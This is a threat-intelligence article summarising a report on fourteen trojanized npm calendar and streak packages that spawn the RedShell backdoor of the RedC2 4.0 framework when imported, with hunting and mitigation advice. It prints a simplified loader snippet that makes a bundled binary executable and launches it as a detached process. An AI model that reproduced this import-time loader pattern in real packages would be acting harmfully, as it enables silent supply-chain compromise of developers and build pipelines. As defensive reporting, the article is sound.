---
title: "RedC2 4.0 AI-Assisted Backdoor Hidden in npm Packages"
date: 2026-08-22T07:53:50+00:00
draft: false
slug: "redc2-4-0-ai-assisted-backdoor-hidden-in-npm-packages"

# ── Content metadata ──
summary: "Fourteen trojanized npm packages posing as calendar and streak utilities have been discovered delivering RedShell, the Linux beacon component of RedC2 4.0 \u2014 a commercially sold, AI-assisted command-and-control framework. The packages are functional by design, lowering suspicion while silently launching a detached backdoor process on import with no install hook required. RedC2 4.0 supports credential theft, in-memory execution, tunneling, and multi-beacon operations, making successful deployment a significant post-exploitation risk for any Linux environment that consumes affected packages."
source: "The Hacker News"
source_url: "https://thehackernews.com/2026/08/14-trojanized-npm-packages-drop-redc2.html"
source_title: "14 Trojanized npm Packages Drop RedC2 4.0 Linux Backdoor With AI-Assisted C2"
source_date: 2026-08-21T18:53:00+00:00
author: "Grid the Grey Editorial"
thumbnail: "https://images.unsplash.com/photo-1736664028735-bf6e862f7296?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3w5Mzc1ODZ8MHwxfHNlYXJjaHw4fHx1bmRlcmdyb3VuZCUyMHR1bm5lbCUyMHNoYWRvdyUyMGV4cGxvcmF0aW9ufGVufDB8MHx8fDE3ODczODUyMzB8MA&ixlib=rb-4.1.0&q=80&w=1080"
# To override: find a photo on unsplash.com or pexels.com, copy image URL, paste above

# ── Content Type ──
content_type: "threat_report"

# ── AI Security Classification ──
relevance_score: 7.2
threat_level: "HIGH"

# ── MITRE ATLAS Techniques ──
mitre_techniques: ["AML.T0010 - AI Supply Chain Compromise", "AML.T0047 - AI-Enabled Product or Service", "AML.T0115 - Publish Poisoned AI Artifacts"]

# ── OWASP LLM Top 10 ──
owasp_categories: ["LLM05 - Supply Chain Vulnerabilities"]

# ── TL;DR ──
tldr_what: "14 trojanized npm packages silently deploy the AI-assisted RedC2 4.0 Linux backdoor on import."
tldr_who_at_risk: "Linux developers and CI/CD pipelines that directly or transitively depend on any of the 14 malicious npm packages are immediately exposed."
tldr_actions: ["Audit all npm dependencies for the 14 identified packages and remove them immediately", "Scan Linux hosts that imported affected packages for RedShell beacon processes (math-core.bin, calc.bin, etc.)", "Enable software composition analysis (SCA) tooling in CI/CD pipelines to flag new or unknown native binaries bundled in npm packages"]

# ── Taxonomies ──
categories: ["Supply Chain", "Industry News"]
tags: ["npm-supply-chain", "trojanized-packages", "linux-backdoor", "redc2", "redshell", "c2-framework", "ai-assisted-c2", "malware", "credential-theft", "in-memory-execution", "post-exploitation", "threat-intelligence"]
frameworks: ["mitre-atlas", "owasp-llm"]
threat_actors: ["cybercriminal"]

# ── Pipeline metadata ──
fetched_at: "2026-08-22T07:53:50+00:00"
feed_source: "thehackernews"
original_url: "https://thehackernews.com/2026/08/14-trojanized-npm-packages-drop-redc2.html"
pipeline_version: "2.1.0"
---

## Overview

Cybersecurity researchers at TrendAI (Trend Micro) have identified 14 malicious npm packages that masquerade as functional calendar and streak utilities while covertly delivering RedShell — the Linux beacon component of RedC2 4.0, a commercially marketed, AI-assisted command-and-control framework. The campaign is notable for two reasons: the packages genuinely perform their advertised functions to avoid suspicion, and the backdoor triggers on a simple module import — no post-install hook required. Any project that pulls in an affected package, even as a transitive dependency, is silently compromised.

## Technical Analysis

The packages — including `streak-metrics-math`, `kit-map-vim`, and twelve others — bundle a Linux ELF binary disguised under names such as `math-core.bin`, `calc-cache.bin`, and `calc.bin`, stored inside `dist/` or `dist/internal/`. The package entry point, `dist/index.mjs`, re-exports legitimate date helpers while simultaneously locating the embedded binary, marking it executable, and spawning it as a detached background process.

```js
// Simplified representation of loader logic in dist/index.mjs
import { execFileSync } from 'child_process';
import { join } from 'path';
const bin = join(__dirname, 'dist', 'math-core.bin');
execFileSync('chmod', ['+x', bin]);
spawn(bin, [], { detached: true, stdio: 'ignore' }).unref();
```

Once active, RedShell establishes an interactive shell via `/bin/sh` and connects to a remote C2 server (Windows or Linux) operated by the attacker. The full RedC2 4.0 framework — advertised by threat actor "MarlboroMan" on Hack Forums in June 2026 — supports terminal access, file transfer, staged payload delivery, credential theft, network visualization, host-to-host tunneling, and in-memory execution of BOFs, .NET assemblies, and shellcode.

RedC2 has been under active development for at least a year: version 2.0 appeared in August 2025, version 3.0 in January 2026, and version 4.0 — which introduced the Linux beacon — in mid-2026.

## Framework Mapping

**MITRE ATLAS:**
- **AML.T0010 – AI Supply Chain Compromise**: Malicious packages injected into the npm ecosystem to compromise downstream consumers.
- **AML.T0047 – AI-Enabled Product or Service**: RedC2 4.0 explicitly markets AI-assisted C2 capabilities as a selling point.
- **AML.T0115 – Publish Poisoned AI Artifacts**: Functional packages used as a delivery vehicle for a malicious binary.

**OWASP LLM Top 10:**
- **LLM05 – Supply Chain Vulnerabilities**: The attack exploits trust in the npm package registry and transitive dependency resolution.

## Impact Assessment

Any Linux developer or automated build pipeline that installs one of the 14 packages — even indirectly — faces immediate backdoor compromise. Post-exploitation capabilities are extensive: attackers gain an interactive shell, can exfiltrate credentials, execute arbitrary code in memory, and pivot across the network. The commercial nature of RedC2 and its active versioning suggest broad deployment across multiple threat actor campaigns beyond this specific npm cluster.

## Mitigation & Recommendations

1. **Remove affected packages immediately**: Cross-reference all direct and transitive npm dependencies against the 14 named packages across both versions.
2. **Hunt for beacon processes**: Search compromised Linux hosts for processes spawned from binaries named `math-core.bin`, `math-calc.bin`, `calc-math.dat`, `calc-cache.bin`, `calc.bin`, or `calc-mapping.bin`.
3. **Deploy Software Composition Analysis (SCA)**: Integrate SCA tooling into CI/CD pipelines to flag packages bundling native binaries without clear provenance.
4. **Monitor outbound C2 traffic**: Apply network detection rules for unexpected outbound connections from Node.js processes on Linux hosts.
5. **Enforce package allowlisting**: Restrict npm installs to organisation-approved registries and pin dependency versions with lock-file integrity checks.

## References

- [The Hacker News – 14 Trojanized npm Packages Drop RedC2 4.0 Linux Backdoor With AI-Assisted C2](https://thehackernews.com/2026/08/14-trojanized-npm-packages-drop-redc2.html)
